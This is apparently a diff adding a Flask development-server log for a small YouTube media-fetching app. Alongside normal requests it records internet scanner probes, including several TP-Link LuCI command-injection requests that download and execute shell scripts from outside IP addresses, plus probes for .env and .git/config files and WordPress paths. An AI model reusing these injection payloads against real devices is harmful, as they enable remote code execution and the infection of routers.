@@ -1,0 +1,1002 @@
+ * Serving Flask app 'app'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5001
+ * Running on http://135.148.27.168:5001
+Press CTRL+C to quit
+127.0.0.1 - - [14/May/2024 18:32:47] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 18:32:48] "GET /series.json HTTP/1.0" 304 -
+[youtube] Extracting URL: https://youtu.be/MEGmpAPdiB0
+[youtube] MEGmpAPdiB0: Downloading webpage
+[youtube] MEGmpAPdiB0: Downloading ios player API JSON
+[youtube] MEGmpAPdiB0: Downloading android player API JSON
+WARNING: [youtube] Skipping player responses from android clients (got player responses for video "aQvGIIdgFDM" instead of "MEGmpAPdiB0")
+ERROR: [youtube] MEGmpAPdiB0: Private video. Sign in if you've been granted access to this video
+127.0.0.1 - - [14/May/2024 18:32:51] "POST /get_media HTTP/1.0" 500 -
+127.0.0.1 - - [14/May/2024 18:33:12] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 18:34:23] "GET /.env HTTP/1.0" 404 -
+[youtube] Extracting URL: https://www.youtube.com/watch?v=Cn5LLdQyq3E
+[youtube] Cn5LLdQyq3E: Downloading webpage
+[youtube] Cn5LLdQyq3E: Downloading ios player API JSON
+[youtube] Cn5LLdQyq3E: Downloading android player API JSON
+WARNING: [youtube] Skipping player responses from android clients (got player responses for video "aQvGIIdgFDM" instead of "Cn5LLdQyq3E")
+[youtube] Cn5LLdQyq3E: Downloading m3u8 information
+127.0.0.1 - - [14/May/2024 18:35:11] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 18:48:37] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 18:52:14] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 18:52:20] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 18:52:21] "GET /series.json HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 18:52:21] "GET /favicon.ico HTTP/1.0" 404 -
+127.0.0.1 - - [14/May/2024 18:52:23] "GET /series.json HTTP/1.0" 200 -
+[youtube] Extracting URL: https://youtu.be/MEGmpAPdiB0
+[youtube] MEGmpAPdiB0: Downloading webpage
+[youtube] MEGmpAPdiB0: Downloading ios player API JSON
+[youtube] MEGmpAPdiB0: Downloading android player API JSON
+WARNING: [youtube] Skipping player responses from android clients (got player responses for video "aQvGIIdgFDM" instead of "MEGmpAPdiB0")
+ERROR: [youtube] MEGmpAPdiB0: Private video. Sign in if you've been granted access to this video
+127.0.0.1 - - [14/May/2024 18:52:33] "POST /get_media HTTP/1.0" 500 -
+127.0.0.1 - - [14/May/2024 18:53:26] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 18:54:21] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 18:54:23] "GET /series.json HTTP/1.0" 304 -
+[youtube] Extracting URL: https://youtu.be/MEGmpAPdiB0
+[youtube] MEGmpAPdiB0: Downloading webpage
+[youtube] MEGmpAPdiB0: Downloading ios player API JSON
+[youtube] MEGmpAPdiB0: Downloading android player API JSON
+WARNING: [youtube] Skipping player responses from android clients (got player responses for video "aQvGIIdgFDM" instead of "MEGmpAPdiB0")
+[youtube] MEGmpAPdiB0: Downloading m3u8 information
+127.0.0.1 - - [14/May/2024 18:54:41] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 18:55:07] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 18:55:07] "GET /series.json HTTP/1.0" 304 -
+[youtube] Extracting URL: https://youtu.be/MEGmpAPdiB0
+[youtube] MEGmpAPdiB0: Downloading webpage
+[youtube] MEGmpAPdiB0: Downloading ios player API JSON
+[youtube] MEGmpAPdiB0: Downloading android player API JSON
+WARNING: [youtube] Skipping player responses from android clients (got player responses for video "aQvGIIdgFDM" instead of "MEGmpAPdiB0")
+[youtube] MEGmpAPdiB0: Downloading m3u8 information
+127.0.0.1 - - [14/May/2024 18:55:14] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 18:55:28] "GET /favicon.ico HTTP/1.0" 404 -
+127.0.0.1 - - [14/May/2024 19:00:07] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 19:00:08] "GET /series.json HTTP/1.0" 304 -
+127.0.0.1 - - [14/May/2024 19:01:51] "GET /robots.txt HTTP/1.0" 404 -
+127.0.0.1 - - [14/May/2024 19:01:51] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 19:05:54] "GET /app-ads.txt HTTP/1.0" 404 -
+127.0.0.1 - - [14/May/2024 19:20:40] "GET /app-ads.txt HTTP/1.0" 404 -
+127.0.0.1 - - [14/May/2024 19:38:25] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+http://103.149.86.202/t+-O-+|+sh`) HTTP/1.0" 404 -
+ * Serving Flask app 'app'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5001
+ * Running on http://135.148.27.168:5001
+Press CTRL+C to quit
+127.0.0.1 - - [14/May/2024 21:26:14] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 21:26:15] "GET /series.json HTTP/1.0" 304 -
+[youtube] Extracting URL: https://www.youtube.com/watch?v=Cn5LLdQyq3E
+[youtube] Cn5LLdQyq3E: Downloading webpage
+[youtube] Cn5LLdQyq3E: Downloading ios player API JSON
+[youtube] Cn5LLdQyq3E: Downloading android player API JSON
+WARNING: [youtube] Skipping player responses from android clients (got player responses for video "aQvGIIdgFDM" instead of "Cn5LLdQyq3E")
+[youtube] Cn5LLdQyq3E: Downloading m3u8 information
+127.0.0.1 - - [14/May/2024 21:26:24] "POST /get_media HTTP/1.0" 200 -
+[youtube] Extracting URL: https://youtu.be/MEGmpAPdiB0
+[youtube] MEGmpAPdiB0: Downloading webpage
+[youtube] MEGmpAPdiB0: Downloading ios player API JSON
+[youtube] MEGmpAPdiB0: Downloading android player API JSON
+WARNING: [youtube] Skipping player responses from android clients (got player responses for video "aQvGIIdgFDM" instead of "MEGmpAPdiB0")
+[youtube] MEGmpAPdiB0: Downloading m3u8 information
+127.0.0.1 - - [14/May/2024 21:26:46] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 21:28:16] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 21:33:15] "GET /favicon.ico HTTP/1.0" 404 -
+[youtube] Extracting URL: https://www.youtube.com/watch?v=lG11SnlLt5A
+[youtube] lG11SnlLt5A: Downloading webpage
+[youtube] lG11SnlLt5A: Downloading ios player API JSON
+[youtube] lG11SnlLt5A: Downloading android player API JSON
+WARNING: [youtube] Skipping player responses from android clients (got player responses for video "aQvGIIdgFDM" instead of "lG11SnlLt5A")
+[youtube] lG11SnlLt5A: Downloading m3u8 information
+127.0.0.1 - - [14/May/2024 21:33:26] "POST /get_media HTTP/1.0" 200 -
+[youtube] Extracting URL: https://www.youtube.com/watch?v=H3EsPXwz4_Q
+[youtube] H3EsPXwz4_Q: Downloading webpage
+[youtube] H3EsPXwz4_Q: Downloading ios player API JSON
+[youtube] H3EsPXwz4_Q: Downloading android player API JSON
+WARNING: [youtube] Skipping player responses from android clients (got player responses for video "aQvGIIdgFDM" instead of "H3EsPXwz4_Q")
+[youtube] H3EsPXwz4_Q: Downloading m3u8 information
+127.0.0.1 - - [14/May/2024 21:34:30] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 21:35:43] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+http://103.149.86.202/t+-O-+|+sh`) HTTP/1.0" 404 -
+127.0.0.1 - - [14/May/2024 21:41:34] "GET /series.json HTTP/1.0" 200 -
+[youtube] Extracting URL: https://www.youtube.com/watch?v=oUpWAKZ6aQs
+[youtube] oUpWAKZ6aQs: Downloading webpage
+[youtube] oUpWAKZ6aQs: Downloading ios player API JSON
+[youtube] oUpWAKZ6aQs: Downloading android player API JSON
+WARNING: [youtube] Skipping player responses from android clients (got player responses for video "aQvGIIdgFDM" instead of "oUpWAKZ6aQs")
+[youtube] oUpWAKZ6aQs: Downloading m3u8 information
+127.0.0.1 - - [14/May/2024 21:41:48] "POST /get_media HTTP/1.0" 200 -
+[youtube] Extracting URL: https://www.youtube.com/watch?v=Vbzdt6K6n1A
+[youtube] Vbzdt6K6n1A: Downloading webpage
+[youtube] Vbzdt6K6n1A: Downloading ios player API JSON
+[youtube] Vbzdt6K6n1A: Downloading android player API JSON
+WARNING: [youtube] Skipping player responses from android clients (got player responses for video "aQvGIIdgFDM" instead of "Vbzdt6K6n1A")
+[youtube] Vbzdt6K6n1A: Downloading m3u8 information
+127.0.0.1 - - [14/May/2024 21:42:24] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 21:43:20] "GET / HTTP/1.0" 200 -
+[youtube] Extracting URL: https://www.youtube.com/watch?v=Cn5LLdQyq3E
+[youtube] Cn5LLdQyq3E: Downloading webpage
+[youtube] Cn5LLdQyq3E: Downloading ios player API JSON
+[youtube] Cn5LLdQyq3E: Downloading android player API JSON
+WARNING: [youtube] Skipping player responses from android clients (got player responses for video "aQvGIIdgFDM" instead of "Cn5LLdQyq3E")
+[youtube] Cn5LLdQyq3E: Downloading m3u8 information
+127.0.0.1 - - [14/May/2024 21:46:34] "POST /get_media HTTP/1.0" 200 -
+[youtube] Extracting URL: https://www.youtube.com/watch?v=oUpWAKZ6aQs
+[youtube] oUpWAKZ6aQs: Downloading webpage
+[youtube] oUpWAKZ6aQs: Downloading ios player API JSON
+[youtube] oUpWAKZ6aQs: Downloading android player API JSON
+WARNING: [youtube] Skipping player responses from android clients (got player responses for video "aQvGIIdgFDM" instead of "oUpWAKZ6aQs")
+[youtube] oUpWAKZ6aQs: Downloading m3u8 information
+127.0.0.1 - - [14/May/2024 21:46:44] "POST /get_media HTTP/1.0" 200 -
+[youtube] Extracting URL: https://www.youtube.com/watch?v=oUpWAKZ6aQs
+[youtube] oUpWAKZ6aQs: Downloading webpage
+[youtube] oUpWAKZ6aQs: Downloading ios player API JSON
+[youtube] oUpWAKZ6aQs: Downloading android player API JSON
+WARNING: [youtube] Skipping player responses from android clients (got player responses for video "aQvGIIdgFDM" instead of "oUpWAKZ6aQs")
+[youtube] oUpWAKZ6aQs: Downloading m3u8 information
+127.0.0.1 - - [14/May/2024 21:46:53] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 21:49:50] "GET /series.json HTTP/1.0" 200 -
+[youtube] Extracting URL: https://www.youtube.com/watch?v=lG11SnlLt5A
+[youtube] lG11SnlLt5A: Downloading webpage
+[youtube] lG11SnlLt5A: Downloading ios player API JSON
+[youtube] lG11SnlLt5A: Downloading android player API JSON
+WARNING: [youtube] Skipping player responses from android clients (got player responses for video "aQvGIIdgFDM" instead of "lG11SnlLt5A")
+[youtube] lG11SnlLt5A: Downloading m3u8 information
+127.0.0.1 - - [14/May/2024 21:50:02] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 21:50:36] "GET /series.json HTTP/1.0" 200 -
+[youtube] Extracting URL: https://www.youtube.com/watch?v=lG11SnlLt5A
+[youtube] lG11SnlLt5A: Downloading webpage
+[youtube] lG11SnlLt5A: Downloading ios player API JSON
+[youtube] lG11SnlLt5A: Downloading android player API JSON
+WARNING: [youtube] Skipping player responses from android clients (got player responses for video "aQvGIIdgFDM" instead of "lG11SnlLt5A")
+[youtube] lG11SnlLt5A: Downloading m3u8 information
+127.0.0.1 - - [14/May/2024 21:51:17] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 21:58:20] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 21:58:45] "GET /series.json HTTP/1.0" 200 -
+[youtube] Extracting URL: https://www.youtube.com/watch?v=lG11SnlLt5A
+[youtube] lG11SnlLt5A: Downloading webpage
+[youtube] lG11SnlLt5A: Downloading ios player API JSON
+[youtube] lG11SnlLt5A: Downloading android player API JSON
+WARNING: [youtube] Skipping player responses from android clients (got player responses for video "aQvGIIdgFDM" instead of "lG11SnlLt5A")
+[youtube] lG11SnlLt5A: Downloading m3u8 information
+127.0.0.1 - - [14/May/2024 21:58:55] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 22:11:57] "GET /series.json HTTP/1.0" 200 -
+[youtube] Extracting URL: https://www.youtube.com/watch?v=lG11SnlLt5A
+[youtube] lG11SnlLt5A: Downloading webpage
+[youtube] lG11SnlLt5A: Downloading ios player API JSON
+[youtube] lG11SnlLt5A: Downloading android player API JSON
+WARNING: [youtube] Skipping player responses from android clients (got player responses for video "aQvGIIdgFDM" instead of "lG11SnlLt5A")
+[youtube] lG11SnlLt5A: Downloading m3u8 information
+127.0.0.1 - - [14/May/2024 22:12:10] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 22:13:22] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 22:28:21] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 22:40:48] "GET /series.json HTTP/1.0" 200 -
+[youtube] Extracting URL: https://www.youtube.com/watch?v=lG11SnlLt5A
+[youtube] lG11SnlLt5A: Downloading webpage
+[youtube] lG11SnlLt5A: Downloading ios player API JSON
+[youtube] lG11SnlLt5A: Downloading android player API JSON
+WARNING: [youtube] Skipping player responses from android clients (got player responses for video "aQvGIIdgFDM" instead of "lG11SnlLt5A")
+[youtube] lG11SnlLt5A: Downloading m3u8 information
+127.0.0.1 - - [14/May/2024 22:41:01] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 22:42:29] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 22:43:23] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 22:43:50] "GET /series.json HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 22:51:41] "GET /series.json HTTP/1.0" 200 -
+[youtube] Extracting URL: https://www.youtube.com/watch?v=lG11SnlLt5A
+[youtube] lG11SnlLt5A: Downloading webpage
+[youtube] lG11SnlLt5A: Downloading ios player API JSON
+[youtube] lG11SnlLt5A: Downloading android player API JSON
+WARNING: [youtube] Skipping player responses from android clients (got player responses for video "aQvGIIdgFDM" instead of "lG11SnlLt5A")
+[youtube] lG11SnlLt5A: Downloading m3u8 information
+127.0.0.1 - - [14/May/2024 22:51:54] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 22:52:30] "GET /series.json HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 22:56:55] "GET /series.json HTTP/1.0" 200 -
+[youtube] Extracting URL: https://www.youtube.com/watch?v=H3EsPXwz4_Q
+[youtube] H3EsPXwz4_Q: Downloading webpage
+[youtube] H3EsPXwz4_Q: Downloading ios player API JSON
+[youtube] H3EsPXwz4_Q: Downloading android player API JSON
+WARNING: [youtube] Skipping player responses from android clients (got player responses for video "aQvGIIdgFDM" instead of "H3EsPXwz4_Q")
+[youtube] H3EsPXwz4_Q: Downloading m3u8 information
+127.0.0.1 - - [14/May/2024 22:57:13] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 22:58:25] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 23:02:51] "GET /series.json HTTP/1.0" 200 -
+[youtube] Extracting URL: https://www.youtube.com/watch?v=Vbzdt6K6n1A
+[youtube] Vbzdt6K6n1A: Downloading webpage
+[youtube] Vbzdt6K6n1A: Downloading ios player API JSON
+[youtube] Vbzdt6K6n1A: Downloading android player API JSON
+WARNING: [youtube] Skipping player responses from android clients (got player responses for video "aQvGIIdgFDM" instead of "Vbzdt6K6n1A")
+[youtube] Vbzdt6K6n1A: Downloading m3u8 information
+127.0.0.1 - - [14/May/2024 23:03:04] "POST /get_media HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 23:03:44] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 23:04:33] "GET /series.json HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 23:05:11] "GET /favicon.ico HTTP/1.0" 404 -
+127.0.0.1 - - [14/May/2024 23:05:11] "GET /series.json HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 23:06:03] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 23:13:26] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 23:14:16] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 23:16:53] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 23:17:23] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 23:26:16] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 23:26:48] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`cd+/tmp;+rm+-rf+shk;+wget+http://193.233.203.237/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk`) HTTP/1.0" 404 -
+127.0.0.1 - - [14/May/2024 23:28:27] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 23:31:47] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 23:43:27] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [14/May/2024 23:44:41] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+http://103.149.86.202/t+-O-+|+sh`) HTTP/1.0" 404 -
+127.0.0.1 - - [14/May/2024 23:58:28] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 00:12:49] "GET /.git/config HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 00:13:30] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 00:16:02] "POST /index.htm HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 00:16:02] "POST /FD873AC4-CF86-4FED-84EC-4BD59C6F17A7 HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 00:16:07] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 00:16:23] "GET //code.jquery.com/jquery-3.5.1.slim.min.js HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 00:19:47] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 00:20:15] "GET /series.js HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 00:20:16] "GET //code.jquery.com/jquery-3.5.1.slim.min.js HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 00:20:17] "GET /dist/umd/popper.min.js HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 00:20:17] "GET //cdn.js HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 00:20:18] "GET //stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 00:27:26] "GET /hello HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 00:27:33] "GET /app-ads.txt HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 00:28:31] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 00:29:25] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+http://103.149.86.202/t+-O-+|+sh`) HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 00:44:44] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 01:00:12] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 01:01:10] "GET /ads.txt HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 01:01:10] "GET /ads.txt HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 01:13:34] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 01:15:25] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+http://103.149.86.202/t+-O-+|+sh`) HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 01:23:54] "GET /ads.txt HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 01:23:54] "GET /ads.txt HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 01:27:09] "GET /.git/config HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 01:28:35] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 01:32:39] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 01:33:12] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 01:33:13] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 01:35:14] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 01:44:12] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 01:53:38] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 01:54:44] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 01:58:37] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 02:13:37] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 02:28:36] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 02:33:23] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 02:33:45] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 02:43:40] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 02:47:19] "GET /app-ads.txt HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 02:47:19] "GET /app-ads.txt HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 02:49:28] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`cd+/tmp;+rm+-rf+shk;+wget+http://193.233.203.237/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk`) HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 03:07:35] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 03:07:53] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 03:09:42] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 03:17:45] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 03:17:45] "GET /series.json HTTP/1.0" 200 -
+205.210.31.248 - - [15/May/2024 03:20:19] code 400, message Bad request version ('À\x13À')
+205.210.31.248 - - [15/May/2024 03:20:19] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03.£ÛYä\x0c«R'íå\x85ñ\x9d,Rÿá\x90 ©\x82«;61:\x13éb_< ô­7\x90ÊÒ \x15³Ø®¤°#»=1L\x01\x1f¸ÙéW¢tºUä\x9emË\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+205.210.31.248 - - [15/May/2024 03:20:19] code 400, message Bad HTTP/0.9 request type ("\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x037>ºl×cÉ;\x1bYl£ÊìøìVkY´|1p¤ÒEn3A\x97¨Ê\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À")
+205.210.31.248 - - [15/May/2024 03:20:19] "\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x037>ºl×cÉ;\x1bYl£ÊìøìVkY´|1p¤ÒEn3A\x97¨Ê\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [15/May/2024 03:26:11] "GET /.env HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 03:37:17] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 03:57:07] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 03:57:07] "GET //wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 03:57:08] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 03:57:08] "GET //blog/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 03:57:08] "GET //web/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 03:57:09] "GET //wordpress/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 03:57:09] "GET //website/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 03:57:09] "GET //wp/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 03:57:10] "GET //news/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 03:57:10] "GET //2018/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 03:57:10] "GET //2019/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 03:57:10] "GET //shop/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 03:57:11] "GET //wp1/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 03:57:11] "GET //test/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 03:57:11] "GET //media/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 03:57:12] "GET //wp2/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 03:57:12] "GET //site/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 03:57:12] "GET //cms/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 03:57:12] "GET //sito/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 04:03:12] "GET //cdn.js HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 04:03:12] "GET //code.jquery.com/jquery-3.5.1.slim.min.js HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 04:03:13] "GET //stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 04:03:13] "GET /dist/umd/popper.min.js HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 04:03:13] "GET /series.js HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 04:03:47] "GET //stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 04:03:47] "GET /dist/umd/popper.min.js HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 04:03:47] "GET /series.js HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 04:03:47] "GET //code.jquery.com/jquery-3.5.1.slim.min.js HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 04:03:47] "GET //cdn.js HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 04:07:22] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 04:25:43] "GET /.env HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 04:25:43] "POST / HTTP/1.0" 405 -
+127.0.0.1 - - [15/May/2024 04:26:01] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 04:26:01] "GET /favicon.ico HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 04:43:40] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 04:43:40] "GET //wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 04:43:41] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [15/May/2024 04:43:41] "GET //blog/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 04:43:41] "GET //web/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 04:43:42] "GET //wordpress/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 04:43:42] "GET //website/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 04:43:42] "GET //wp/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 04:43:42] "GET //news/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 04:43:43] "GET //2018/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 04:43:43] "GET //2019/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 04:43:43] "GET //shop/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 04:43:43] "GET //wp1/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
+127.0.0.1 - - [15/May/2024 04:43:44] "GET //test/wp-includes/wlwmanifest.xml HTTP/1.0" 404 -
